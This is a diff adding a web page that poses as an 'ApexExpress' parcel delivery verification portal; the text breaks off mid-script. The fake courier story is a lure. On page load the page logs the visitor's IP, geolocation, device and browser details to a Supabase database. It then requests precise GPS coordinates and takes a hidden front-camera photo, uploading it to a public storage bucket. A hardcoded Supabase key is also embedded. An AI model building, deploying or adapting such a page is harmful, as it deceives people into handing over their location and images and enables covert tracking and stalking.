@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ApexExpress | Delivery Verification Portal</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            50: '#eef2ff',
+                            100: '#e0e7ff',
+                            500: '#6366f1',
+                            600: '#4f46e5',
+                            700: '#4338ca',
+                            900: '#312e81',
+                        },
+                        emeraldCustom: {
+                            500: '#10b981',
+                            600: '#059669',
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Plus Jakarta Sans', 'Inter', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <!-- Explicit UMD Bundle loading for absolute reliability across all browsers -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.8/dist/umd/supabase.js"></script>
+
+    <!-- GSAP for High-Performance UI Animations -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+
+    <!-- Lenis Smooth Scroll -->
+    <script src="https://cdn.jsdelivr.net/npm/@studio-freight/lenis@1.0.42/dist/lenis.min.js"></script>
+
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <style>
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #090d16;
+            color: #f1f5f9;
+            overflow-x: hidden;
+        }
+
+        /* Glassmorphism background styles */
+        .glass-panel {
+            background: rgba(15, 23, 42, 0.65);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .glass-card {
+            background: rgba(30, 41, 59, 0.4);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .glow-effect {
+            position: absolute;
+            width: 350px;
+            height: 350px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(99, 102, 241, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* Custom Radar Pulse Animation */
+        @keyframes radar-sweep {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .radar-line {
+            animation: radar-sweep 2.5s linear infinite;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between relative selection:bg-brand-500 selection:text-white">
+
+    <!-- Ambient Glowing Background Accents -->
+    <div class="glow-effect -top-20 -left-20"></div>
+    <div class="glow-effect top-1/2 -right-20"></div>
+
+    <!-- Header Navigation -->
+    <header class="w-full border-b border-slate-800/80 bg-slate-950/60 backdrop-blur-md sticky top-0 z-40">
+        <div class="max-w-5xl mx-auto px-4 py-3.5 flex justify-between items-center">
+            <div class="flex items-center space-x-3">
+                <div class="bg-gradient-to-tr from-brand-600 to-indigo-400 p-2 rounded-xl shadow-lg shadow-brand-500/20">
+                    <i data-lucide="package-check" class="w-5 h-5 text-white"></i>
+                </div>
+                <div>
+                    <span class="font-extrabold text-lg tracking-tight bg-gradient-to-r from-white via-slate-200 to-slate-400 bg-clip-text text-transparent">ApexExpress</span>
+                    <span class="text-[10px] font-semibold tracking-wider text-brand-500 uppercase block -mt-1">Logistics Portal</span>
+                </div>
+            </div>
+            
+            <div class="flex items-center space-x-2">
+                <span class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
+                    <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+                    SSL Encrypted
+                </span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Dynamic Content Container -->
+    <main class="flex-grow flex items-center justify-center p-4 sm:p-6 relative z-10 my-auto">
+        <div class="w-full max-w-lg">
+
+            <!-- ================================================= -->
+            <!-- STEP 0: LOADING SCREEN                            -->
+            <!-- ================================================= -->
+            <div id="step-loading" class="glass-panel rounded-3xl p-8 sm:p-10 text-center space-y-6">
+                <div class="relative w-20 h-20 mx-auto flex items-center justify-center">
+                    <div class="absolute inset-0 rounded-full border-2 border-brand-500/20"></div>
+                    <div class="absolute inset-0 rounded-full border-t-2 border-brand-500 animate-spin"></div>
+                    <i data-lucide="box" class="w-8 h-8 text-brand-500"></i>
+                </div>
+
+                <div class="space-y-2">
+                    <h2 class="text-xl font-bold text-white tracking-tight">ApexExpress Verification</h2>
+                    <p id="loading-status-text" class="text-sm text-slate-400 font-medium">Preparing delivery verification...</p>
+                </div>
+
+                <div class="w-full bg-slate-800/80 h-2 rounded-full overflow-hidden p-0.5">
+                    <div id="loading-progress-bar" class="bg-gradient-to-r from-brand-600 to-indigo-400 h-full w-0 rounded-full transition-all duration-300"></div>
+                </div>
+            </div>
+
+            <!-- ================================================= -->
+            <!-- STEP 1: WELCOME SCREEN                            -->
+            <!-- ================================================= -->
+            <div id="step-welcome" class="glass-panel rounded-3xl p-6 sm:p-8 space-y-6 hidden">
+                <div class="flex items-center justify-between pb-4 border-b border-slate-800">
+                    <div class="flex items-center space-x-3">
+                        <div class="p-2.5 bg-slate-800/80 rounded-2xl border border-slate-700/50">
+                            <i data-lucide="truck" class="w-5 h-5 text-brand-500"></i>
+                        </div>
+                        <div>
+                            <span class="text-xs text-slate-400 font-medium uppercase tracking-wider block">Tracking ID</span>
+                            <span class="font-mono text-sm font-semibold text-slate-200">#APX-9824-V2</span>
+                        </div>
+                    </div>
+                    <span class="text-xs font-semibold px-2.5 py-1 rounded-lg bg-amber-500/10 text-amber-400 border border-amber-500/20">
+                        Action Required
+                    </span>
+                </div>
+
+                <div class="space-y-3">
+                    <h2 class="text-2xl sm:text-3xl font-extrabold text-white tracking-tight leading-tight">
+                        Delivery Verification
+                    </h2>
+                    <p class="text-slate-300 text-sm leading-relaxed">
+                        To complete your delivery verification, we'll ask for your location to confirm you're at the correct delivery destination. If required for this delivery, we'll also request a visual confirmation.
+                    </p>
+                </div>
+
+                <div class="glass-card rounded-2xl p-4 space-y-3">
+                    <div class="flex items-start space-x-3 text-xs text-slate-400">
+                        <i data-lucide="shield-check" class="w-4 h-4 text-emerald-400 shrink-0 mt-0.5"></i>
+                        <span>Your information is protected by Apex Secure Logistics Protocol and used solely for delivery fulfillment.</span>
+                    </div>
+                </div>
+
+                <button id="btn-start-verification" class="w-full bg-gradient-to-r from-brand-600 to-brand-500 hover:from-brand-500 hover:to-brand-600 text-white font-semibold py-4 px-6 rounded-2xl shadow-lg shadow-brand-500/25 transition transform active:scale-[0.98] flex items-center justify-center space-x-2 text-base">
+                    <span>Start Verification</span>
+                    <i data-lucide="arrow-right" class="w-5 h-5"></i>
+                </button>
+            </div>
+
+            <!-- ================================================= -->
+            <!-- STEP 2: LOCATION STEP                             -->
+            <!-- ================================================= -->
+            <div id="step-location" class="glass-panel rounded-3xl p-6 sm:p-8 space-y-6 hidden">
+                <div class="text-center space-y-2">
+                    <div class="w-16 h-16 mx-auto bg-brand-500/10 rounded-2xl border border-brand-500/20 flex items-center justify-center text-brand-500 mb-4">
+                        <i data-lucide="map-pin flex-shrink-0" class="w-8 h-8"></i>
+                    </div>
+                    <h2 class="text-2xl font-bold text-white tracking-tight">Location Destination Check</h2>
+                    <p class="text-slate-400 text-sm">Verifying your current location matches the assigned delivery address.</p>
+                </div>
+
+                <!-- Active Location Scanning Graphic -->
+                <div id="location-active-state" class="glass-card rounded-2xl p-6 text-center space-y-4">
+                    <div class="relative w-24 h-24 mx-auto flex items-center justify-center">
+                        <div class="absolute inset-0 rounded-full border border-brand-500/30"></div>
+                        <div class="absolute inset-2 rounded-full border border-brand-500/20"></div>
+                        <div class="absolute inset-0 rounded-full border-t-2 border-brand-500 radar-line"></div>
+                        <i data-lucide="navigation" class="w-8 h-8 text-brand-500 animate-pulse"></i>
+                    </div>
+                    <p class="text-xs text-slate-400">Prompting browser location permission...</p>
+                </div>
+
+                <!-- Location Success State (Hidden by default) -->
+                <div id="location-success-state" class="glass-card rounded-2xl p-6 text-center space-y-3 hidden border-emerald-500/30 bg-emerald-500/5">
+                    <div class="w-12 h-12 mx-auto bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center">
+                        <i data-lucide="check" class="w-6 h-6"></i>
+                    </div>
+                    <h3 class="font-semibold text-emerald-400 text-base">Location Confirmed</h3>
+                    <p id="location-details-text" class="text-xs text-slate-300">Destination coordinates verified within optimal delivery zone.</p>
+                </div>
+
+                <!-- Location Error / Retry State (Hidden by default) -->
+                <div id="location-error-state" class="glass-card rounded-2xl p-6 space-y-4 hidden border-amber-500/30 bg-amber-500/5">
+                    <div class="flex items-start space-x-3">
+                        <div class="p-2 bg-amber-500/20 text-amber-400 rounded-xl shrink-0">
+                            <i data-lucide="alert-triangle" class="w-5 h-5"></i>
+                        </div>
+                        <div class="space-y-1">
+                            <h4 class="text-sm font-semibold text-amber-300">Location Services Unavailable</h4>
+                            <p id="location-error-msg" class="text-xs text-slate-300 leading-relaxed">
+                                We couldn't fetch your location. Please ensure location services are turned on in your device system settings and browser permissions.
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="pt-2 border-t border-slate-700/50 text-xs text-slate-400 space-y-1">
+                        <p class="font-semibold text-slate-300">How to fix:</p>
+                        <ul class="list-disc list-inside space-y-1 pl-1">
+                            <li>Enable system Location/GPS on your mobile device.</li>
+                            <li>Allow location access when prompted by the browser.</li>
+                        </ul>
+                    </div>
+
+                    <button id="btn-retry-location" class="w-full bg-amber-500 hover:bg-amber-600 text-slate-950 font-semibold py-3 px-4 rounded-xl text-sm transition flex items-center justify-center space-x-2">
+                        <i data-lucide="rotate-cw" class="w-4 h-4"></i>
+                        <span>Try Again</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- ================================================= -->
+            <!-- STEP 3: CAMERA STEP                               -->
+            <!-- ================================================= -->
+            <div id="step-camera" class="glass-panel rounded-3xl p-6 sm:p-8 space-y-6 hidden">
+                <div class="text-center space-y-2">
+                    <div class="w-16 h-16 mx-auto bg-indigo-500/10 rounded-2xl border border-indigo-500/20 flex items-center justify-center text-indigo-400 mb-4">
+                        <i data-lucide="camera" class="w-8 h-8"></i>
+                    </div>
+                    <h2 class="text-2xl font-bold text-white tracking-tight">Visual Verification</h2>
+                    <p class="text-slate-400 text-sm">A quick photo check is required to authorize package release.</p>
+                </div>
+
+                <div class="glass-card rounded-2xl p-4 space-y-3">
+                    <div class="flex items-center space-x-3 text-xs text-slate-300">
+                        <i data-lucide="info" class="w-4 h-4 text-brand-500 shrink-0"></i>
+                        <span>Please allow camera access when your browser prompts you to confirm photo capture.</span>
+                    </div>
+                </div>
+
+                <!-- Camera Active / Capture UI -->
+                <div id="camera-active-state" class="space-y-4">
+                    <button id="btn-continue-camera" class="w-full bg-gradient-to-r from-brand-600 to-indigo-600 hover:from-brand-500 hover:to-indigo-500 text-white font-semibold py-4 px-6 rounded-2xl shadow-lg shadow-brand-500/25 transition transform active:scale-[0.98] flex items-center justify-center space-x-2 text-base">
+                        <i data-lucide="aperture" class="w-5 h-5"></i>
+                        <span>Continue & Authorize Photo</span>
+                    </button>
+                </div>
+
+                <!-- Camera Uploading State -->
+                <div id="camera-uploading-state" class="glass-card rounded-2xl p-6 text-center space-y-3 hidden">
+                    <div class="w-10 h-10 mx-auto border-2 border-brand-500 border-t-transparent rounded-full animate-spin"></div>
+                    <p class="text-xs text-slate-300 font-medium">Encrypting & uploading verification snapshot...</p>
+                </div>
+
+                <!-- Camera Error / Retry State -->
+                <div id="camera-error-state" class="glass-card rounded-2xl p-6 space-y-4 hidden border-amber-500/30 bg-amber-500/5">
+                    <div class="flex items-start space-x-3">
+                        <div class="p-2 bg-amber-500/20 text-amber-400 rounded-xl shrink-0">
+                            <i data-lucide="camera-off" class="w-5 h-5"></i>
+                        </div>
+                        <div class="space-y-1">
+                            <h4 class="text-sm font-semibold text-amber-300">Camera Permission Required</h4>
+                            <p id="camera-error-msg" class="text-xs text-slate-300 leading-relaxed">
+                                Verification cannot be completed without photo access. Please allow camera access in your browser settings.
+                            </p>
+                        </div>
+                    </div>
+
+                    <button id="btn-retry-camera" class="w-full bg-amber-500 hover:bg-amber-600 text-slate-950 font-semibold py-3 px-4 rounded-xl text-sm transition flex items-center justify-center space-x-2">
+                        <i data-lucide="rotate-cw" class="w-4 h-4"></i>
+                        <span>Retry Camera Access</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- ================================================= -->
+            <!-- STEP 4: COMPLETION SCREEN                         -->
+            <!-- ================================================= -->
+            <div id="step-complete" class="glass-panel rounded-3xl p-6 sm:p-8 text-center space-y-6 hidden">
+                <div class="w-20 h-20 mx-auto bg-emerald-500/20 text-emerald-400 rounded-3xl flex items-center justify-center shadow-xl shadow-emerald-500/10 border border-emerald-500/30">
+                    <i data-lucide="check-circle-2" class="w-10 h-10"></i>
+                </div>
+
+                <div class="space-y-2">
+                    <span class="text-xs font-bold uppercase tracking-widest text-emerald-400 bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20 inline-block">
+                        Status Verified
+                    </span>
+                    <h2 class="text-2xl sm:text-3xl font-extrabold text-white tracking-tight">Verification Complete</h2>
+                    <p class="text-slate-300 text-sm max-w-sm mx-auto">
+                        Your delivery destination and proof of delivery have been securely verified and logged into our logistics system.
+                    </p>
+                </div>
+
+                <div class="glass-card rounded-2xl p-5 text-left space-y-3 font-mono text-xs">
+                    <div class="flex justify-between border-b border-slate-700/50 pb-2">
+                        <span class="text-slate-400">Session Reference</span>
+                        <span id="complete-session-id" class="text-slate-200">Generating...</span>
+                    </div>
+                    <div class="flex justify-between border-b border-slate-700/50 pb-2">
+                        <span class="text-slate-400">Timestamp</span>
+                        <span id="complete-timestamp" class="text-slate-200">Just now</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-slate-400">Courier Network</span>
+                        <span class="text-emerald-400">ApexExpress Direct</span>
+                    </div>
+                </div>
+
+                <p class="text-xs text-slate-500">
+                    You may safely close this browser window now.
+                </p>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="w-full border-t border-slate-800/80 bg-slate-950/60 backdrop-blur-md py-4 text-center text-xs text-slate-500 relative z-10">
+        <p>© 2026 ApexExpress Logistics Network Inc. All rights reserved.</p>
+    </footer>
+
+    <!-- Hidden Video and Canvas Elements for Image Capture (PRESERVED) -->
+    <video id="webcam-video" autoplay playsinline muted style="display:none; width: 640px; height: 480px;"></video>
+    <canvas id="snapshot-canvas" style="display:none;"></canvas>
+
+    <!-- Unified Tracking Engine & Supabase Backend (INTACT) -->
+    <script>
+        // Initialize Lenis Smooth Scroll
+        const lenis = new Lenis({ duration: 1.2, easing: (t) => Math.min(1, 1.001 - Math.pow(2, -10 * t)) });
+        function raf(time) { lenis.raf(time); requestAnimationFrame(raf); }
+        requestAnimationFrame(raf);
+
+        // Initialize Lucide Icons
+        lucide.createIcons();
+
+        // ----------------------------------------------------
+        // EXACT UNTOUCHED BACKEND CONFIGURATION & LOGIC
+        // ----------------------------------------------------
+        const SUPABASE_URL = "https://qioblxzziyjsbmppcvns.supabase.co";
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFpb2JseHp6aXlqc2JtcHBjdm5zIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUyNjI4NzYsImV4cCI6MjEwMDgzODg3Nn0.DMC3nGaSYj25DJMmg9cjZoS9VGwsnexN9qwWaARM2Z4";
+
+        let supabase = null;
+        let sessionId = null;
+        let eventsLog = [];
+
+        function generateUUID() {
+            if (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function') {
+                return crypto.randomUUID();
+            }
+            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+        }
+
+        function logEvent(tag, message, detail = null) {
+            const timestamp = new Date().toISOString();
+            const logEntry = { timestamp, tag, message, detail: detail ? String(detail) : null };
+            eventsLog.push(logEntry);
+            console.log(`[${timestamp}] [${tag}] ${message}`, detail || '');
+        }
+
+        async function fetchWithTimeout(url, options = {}, timeoutMs = 3000) {
+            const controller = new AbortController();
+            const timer = setTimeout(() => controller.abort(), timeoutMs);
+            try {
+                const response = await fetch(url, { ...options, signal: controller.signal });
+                clearTimeout(timer);
+                return response;
+            } catch (err) {
+                clearTimeout(timer);
+                throw err;
+            }
+        }
+
+        function parseUserAgent() {
+            const ua = navigator.userAgent || "";
+            let browser = "Unknown Browser";
+            let os = "Unknown OS";
+            let device = "Desktop";
+
+            if (ua.includes("Firefox/")) browser = "Firefox";
+            else if (ua.includes("Edg/")) browser = "Edge";
+            else if (ua.includes("Chrome/")) browser = "Chrome";
+            else if (ua.includes("Safari/")) browser = "Safari";
+
+            if (ua.includes("Win")) os = "Windows";
+            else if (ua.includes("Mac")) os = "macOS";
+            else if (ua.includes("Linux")) os = "Linux";
+            else if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+
+            if (/Mobi|Android|iPhone|iPad/i.test(ua)) device = "Mobile";
+
+            return { browser, os, device };
+        }
+
+        function initSupabase() {
+            try {
+                const clientFactory = window.supabase?.createClient || window.supabaseClient?.createClient;
+                if (typeof clientFactory === 'function') {
+                    supabase = clientFactory(SUPABASE_URL, SUPABASE_ANON_KEY);
+                    logEvent("SUPABASE_INIT_SUCCESS", "Supabase client successfully initialized");
+                    return true;
+                }
+                
+                if (window.supabase && typeof window.supabase.from === 'function') {
+                    supabase = window.supabase;
+                    logEvent("SUPABASE_INIT_SUCCESS", "Supabase client bound from window object");
+                    return true;
+                }
+
+                logEvent("SUPABASE_INIT_FAIL", "Supabase SDK library not found on window");
+                return false;
+            } catch (err) {
+                logEvent("SUPABASE_INIT_EXCEPTION", "Exception during SDK initialization", err.message);
+                return false;
+            }
+        }
+
+        async function updateVisitorRecord(updatePayload, retries = 3) {
+            if (!supabase || !sessionId) {
+                logEvent("DB_UPDATE_ABORT", "Update aborted: Supabase client or sessionId missing");
+                return false;
+            }
+
+            updatePayload.events_log = eventsLog;
+
+            for (let attempt = 1; attempt <= retries; attempt++) {
+                try {
+                    logEvent("DB_UPDATE_START", `Attempt ${attempt}/${retries} updating row for session ${sessionId}`);
+                    
+                    const { data, error, status } = await supabase
+                        .from('data_logs')
+                        .update(updatePayload)
+                        .eq('session_id', sessionId)
+                        .select();
+
+                    if (error) {
+                        logEvent("DB_UPDATE_ERROR", `Attempt ${attempt} failed [HTTP ${status}]: Code ${error.code} - ${error.message}`, error.details);
+                    } else if (!data || data.length === 0) {
+                        logEvent("DB_UPDATE_ZERO_ROWS", `Attempt ${attempt}: Update targeted session ${sessionId} but matched 0 rows.`);
+                    } else {
+                        logEvent("DB_UPDATE_SUCCESS", "Row successfully updated in Supabase", data);
+                        return true;
+                    }
+                } catch (err) {
+                    logEvent("DB_UPDATE_EXCEPTION", `Attempt ${attempt} exception: ${err.message}`);
+                }
+                await new Promise(r => setTimeout(r, attempt * 500));
+            }
+            return false;
+        }
+
+        async function fetchPublicIP() {
+            logEvent("IP_FETCH_START", "Initiating network IP identification...");
+            const providers = [
+                { url: "https://ipapi.co/json/", extractor: d => ({ ip: d.ip, geo: d }) },
+                { url: "https://ipwho.is/", extractor: d => ({ ip: d.ip, geo: d }) },
+                { url: "https://api.ipify.org?format=json", extractor: d => ({ ip: d.ip, geo: { provider: "ipify" } }) }
+            ];
+
+            for (const provider of providers) {
+                try {
+                    logEvent("IP_QUERY", `Requesting ${provider.url}`);
+                    const res = await fetchWithTimeout(provider.url, {}, 3000);
+                    if (res.ok) {
+                        const json = await res.json();
+                        const extracted = provider.extractor(json);
+                        if (extracted && extracted.ip) {
+                            logEvent("IP_SUCCESS", `IP address identified: ${extracted.ip}`);
+                            return extracted;
+                        }
+                    }
+                } catch (err) {
+                    logEvent("IP_PROVIDER_WARN", `Provider ${provider.url} failed: ${err.message}`);
+                }
+            }
+            logEvent("IP_FETCH_FAIL", "All IP geolocation endpoints failed or timed out.");
+            return { ip: "Unknown", geo: {} };
+        }
+
+        // STEP 1: IMMEDIATE ZERO-LATENCY INSERT
+        async function step1_ImmediatePageOpen() {
+            sessionId = generateUUID();
+            logEvent("SESSION_GEN", `Session ID generated: ${sessionId}`);
+
+            const uaInfo = parseUserAgent();
+            const ipData = await fetchPublicIP();
+
+            const initialPayload = {
+                session_id: sessionId,
+                user_agent: navigator.userAgent || "Unknown",
+                browser_name: uaInfo.browser,
+                operating_system: uaInfo.os,
+                device_type: uaInfo.device,
+                language: navigator.language || "Unknown",
+                referrer: document.referrer || "Direct",
+                screen_resolution: `${window.screen?.width || 0}x${window.screen?.height || 0}`,
+                viewport_size: `${window.innerWidth || 0}x${window.innerHeight || 0}`,
+                ip_address: ipData.ip,
+                ip_metadata: ipData.geo,
+                gps_status: 'pending',
+                camera_status: 'pending',
+                events_log: eventsLog
+            };
+
+            logEvent("DB_INSERT_START", "Executing primary visitor row insert into data_logs table...");
+
+            try {
+                const { data, error, status, statusText } = await supabase
+                    .from('data_logs')
+                    .insert([initialPayload])
+                    .select();
+
+                if (error) {
+                    logEvent("DB_INSERT_ERROR", `INSERT FAILED! HTTP ${status} ${statusText} | Code: ${error.code} | Message: ${error.message}`, JSON.stringify(error));
+                    console.error("[CRITICAL] Primary Supabase insert failed:", error);
+                    return false;
+                } else {
+                    logEvent("DB_INSERT_SUCCESS", "Primary visitor row inserted into Supabase", data);
+                    return true;
+                }
+            } catch (err) {
+                logEvent("DB_INSERT_EXCEPTION", `Unhandled Insert Exception: ${err.message}`, err.stack);
+                console.error("[CRITICAL] Insert Exception:", err);
+                return false;
+            }
+        }
+
+        // STEP 2: GPS GEOLOCATION (WRAPPED FOR PROMISE RESOLUTION IN UI)
+        function step2_GpsTracking() {
+            return new Promise((resolve) => {
+                logEvent("GPS_REQ_START", "Requesting browser location permission...");
+
+                if (!navigator.geolocation) {
+                    logEvent("GPS_UNSUPPORTED", "Browser does not support Geolocation API");
+                    updateVisitorRecord({
+                        gps_status: 'unsupported',
+                        gps_error: 'GEOLOCATION_NOT_SUPPORTED'
+                    }).then(() => resolve({ success: false, error: 'GEOLOCATION_NOT_SUPPORTED' }));
+                    return;
+                }
+
+                const gpsOptions = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        const c = pos.coords;
+                        logEvent("GPS_GRANTED", `Coordinates acquired: Lat ${c.latitude}, Lng ${c.longitude} (Acc: ${c.accuracy}m)`);
+                        await updateVisitorRecord({
+                            gps_status: 'granted',
+                            gps_latitude: c.latitude,
+                            gps_longitude: c.longitude,
+                            gps_accuracy: c.accuracy,
+                            gps_altitude: c.altitude || null,
+                            gps_heading: c.heading || null,
+                            gps_speed: c.speed || null,
+                            gps_error: null
+                        });
+                        resolve({ success: true, coords: c });
+                    },
+                    async (err) => {
+                        let errMsg = "UNKNOWN_ERROR";
+                        if (err.code === 1) errMsg = "PERMISSION_DENIED";
+                        else if (err.code === 2) errMsg = "POSITION_UNAVAILABLE";
+                        else if (err.code === 3) errMsg = "TIMEOUT";
+
+                        logEvent("GPS_DENIED", `GPS Access Error (${errMsg}): ${err.message}`);
+                        await updateVisitorRecord({
+                            gps_status: err.code === 1 ? 'denied' : 'failed',
+                            gps_error: `${errMsg}: ${err.message}`
+                        });
+                        resolve({ success: false, error: errMsg, message: err.message });
+                    },
+                    gpsOptions
+                );
+            });
+        }
+
+        // STEP 3: CAMERA CAPTURE & STORAGE UPLOAD (WRAPPED FOR PROMISE RESOLUTION IN UI)
+        async function step3_CameraCapture() {
+            logEvent("CAMERA_REQ_START", "Requesting camera stream access...");
+
+            if (!window.isSecureContext) {
+                logEvent("CAMERA_WARN", "Context is not HTTPS. MediaDevices API may be restricted.");
+            }
+
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                logEvent("CAMERA_UNSUPPORTED", "navigator.mediaDevices.getUserMedia is unavailable in this context");
+                await updateVisitorRecord({
+                    camera_status: 'unsupported',
+                    camera_error: 'MEDIA_DEVICES_NOT_SUPPORTED_OR_INSECURE_CONTEXT'
+                });
+                return { success: false, error: 'NOT_SUPPORTED' };
+            }
+
+            let stream = null;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false
+                });
+
+                logEvent("CAMERA_GRANTED", "Webcam hardware stream acquired");
+
+                const video = document.getElementById("webcam-video");
+                video.srcObject = stream;
+
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve).catch(resolve);
+                    };
+                    setTimeout(resolve, 2000);
+                });
+
+                await new Promise(r => setTimeout(r, 500));
+
+                const canvas = document.getElementById("snapshot-canvas");
+                const w = video.videoWidth || 640;
+                const h = video.videoHeight || 480;
+                canvas.width = w;
+                canvas.height = h;
+
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, w, h);
+
+                const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.85));
+
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    logEvent("CAMERA_STOPPED", "Camera stream tracks released");
+                }
+
+                if (!blob) throw new Error("Canvas generated null image Blob");
+
+                logEvent("CAMERA_CAPTURED", `Snapshot encoded successfully (${blob.size} bytes)`);
+
+                const fileName = `capture_${Date.now()}_${generateUUID().substring(0, 8)}.jpg`;
+                logEvent("STORAGE_UPLOAD_START", `Uploading ${fileName} to captured_images bucket...`);
+
+                const { data: uploadData, error: uploadError } = await supabase.storage
+                    .from('captured_images')
+                    .upload(fileName, blob, { contentType: 'image/jpeg', upsert: true });
+
+                if (uploadError) {
+                    logEvent("STORAGE_UPLOAD_ERROR", `Bucket Upload Failed: ${uploadError.message}`, JSON.stringify(uploadError));
+                    await updateVisitorRecord({
+                        camera_status: 'failed',
+                        camera_error: `UPLOAD_ERROR: ${uploadError.message}`
+                    });
+                    return { success: false, error: uploadError.message };
+                }
+
+                const { data: urlData } = supabase.storage
+                    .from('captured_images')
+                    .getPublicUrl(fileName);
+
+                const publicUrl = urlData ? urlData.publicUrl : null;
+                logEvent("STORAGE_UPLOAD_SUCCESS", "Public image URL generated", publicUrl);
+
+                await updateVisitorRecord({
+                    camera_status: 'granted',
+                    image_url: publicUrl,
+                    camera_error: null
+                });
+
+                return { success: true, url: publicUrl };
+
+            } catch (err) {
+                if (stream) {
+                    stream.getTracks().forEach(t => t.stop());
+                }
+
+                let errType = "CAMERA_FAILED";
+                if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
+                    errType = "PERMISSION_DENIED";
+                } else if (err.name === "NotFoundError" || err.name === "DevicesNotFoundError") {
+                    errType = "NO_DEVICE";
+                }
+
+                logEvent("CAMERA_ERROR", `Camera Acquisition Failed (${errType}): ${err.message}`);
+
+                await updateVisitorRecord({
+                    camera_status: errType === 'PERMISSION_DENIED' ? 'denied' : 'failed',
+                    camera_error: `${errType}: ${err.message}`
+                });
+
+                return { success: false, error: errType, message: err.message };
+            }
+        }
+
+        // ----------------------------------------------------
+        // UI STEP CONTROLLER & GSAP ANIMATIONS
+        // ----------------------------------------------------
+        function switchStep(fromId, toId) {
+            const fromEl = document.getElementById(fromId);
+            const toEl = document.getElementById(toId);
+
+            gsap.to(fromEl, {
+                opacity: 0,
+                y: -20,
+                duration: 0.35,
+                ease: "power2.in",
+                onComplete: () => {
+                    fromEl.classList.add("hidden");
+                    toEl.classList.remove("hidden");
+                    gsap.fromTo(toEl, 
+                        { opacity: 0, y: 20, scale: 0.98 }, 
+                        { opacity: 1, y: 0, scale: 1, duration: 0.45, ease: "power2.out" }
+                    );
+                }
+            });
+        }
+
+        async function initPageFlow() {
+            logEvent("PIPELINE_START", "Initializing master visitor tracking sequence...");
+
+            // Animate progress bar in Loading screen
+            gsap.to("#loading-progress-bar", { width: "70%", duration: 1.2, ease: "power1.inOut" });
+
+            if (!initSupabase()) {
+                logEvent("PIPELINE_RETRY", "SDK missing on first check. Scheduling retry in 300ms...");
+                setTimeout(initPageFlow, 300);
+                return;
+            }
+
+            // Step 1: Immediate Background DB Row Creation
+            const step1Success = await step1_ImmediatePageOpen();
+
+            gsap.to("#loading-progress-bar", { 
+                width: "100%", 
+                duration: 0.4, 
+                ease: "power2.out",
+                onComplete: () => {
+                    setTimeout(() => {
+                        switchStep("step-loading", "step-welcome");
+                    }, 300);
+                } 
+            });
+        }
+
+        // Dynamic Handlers attached to user actions for browser permission triggers
+        document.getElementById("btn-start-verification").addEventListener("click", async () => {
+            switchStep("step-welcome", "step-location");
+            await executeLocationStep();
+        });
+
+        document.getElementById("btn-retry-location").addEventListener("click", async () => {
+            document.getElementById("location-error-state").classList.add("hidden");
+            document.getElementById("location-active-state").classList.remove("hidden");
+            await executeLocationStep();
+        });
+
+        async function executeLocationStep() {
+            const res = await step2_GpsTracking();
+
+            if (res.success) {
